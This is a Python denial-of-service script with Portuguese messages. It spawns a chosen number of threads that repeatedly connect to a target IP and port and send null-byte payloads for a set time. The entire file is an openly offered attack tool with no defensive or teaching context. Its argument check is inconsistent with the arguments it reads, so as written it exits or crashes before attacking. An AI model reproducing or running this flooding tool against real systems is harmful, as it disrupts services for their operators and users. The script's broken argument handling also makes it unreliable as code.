import socket
import threading
import time
import sys

class DosAttack:
    def __init__(self, target_ip, target_port, duration, num_threads):
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.num_threads = num_threads
        self.start_time = time.time()

    def attack(self):
        while time.time() - self.start_time < self.duration:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    s.connect((self.target_ip, self.target_port))
                    s.sendto(b'\x00' * 1024, (self.target_ip, self.target_port))
                    print(f"Pacote enviado para {self.target_ip}:{self.target_port}")
            except socket.error as e:
                print(f"Erro ao enviar pacote: {e}")

    def start_attack(self):
        threads = []
        for i in range(self.num_threads):
            thread = threading.Thread(target=self.attack)
            threads.append(thread)
            thread.start()
        
        # Aguarde todos os threads terminarem
        for thread in threads:
            thread.join()

def main():
    if len(sys.argv) != 4:
        print("Uso: python dos_attack.py <target_ip> <target_port> <duration_in_seconds> <num_threads>")
        sys.exit(1)

    target_ip = sys.argv[1]
    try:
        target_port = int(sys.argv[2])
        duration = int(sys.argv[3])
        num_threads = int(sys.argv[4])
    except ValueError:
        print("Porta, duração e número de threads devem ser números inteiros.")
        sys.exit(1)

    if duration <= 0 or num_threads <= 0 or target_port <= 0 or target_port > 65535:
        print("Duração, número de threads e porta devem ser maiores que 0 e a porta deve ser entre 1 e 65535.")
        sys.exit(1)

    dos_attacker = DosAttack(target_ip, target_port, duration, num_threads)

    print(f"Iniciando ataque DoS em {target_ip}:{target_port} por {duration} segundos com {num_threads} threads...")
    dos_attacker.start_attack()

if __name__ == "__main__":
    main()
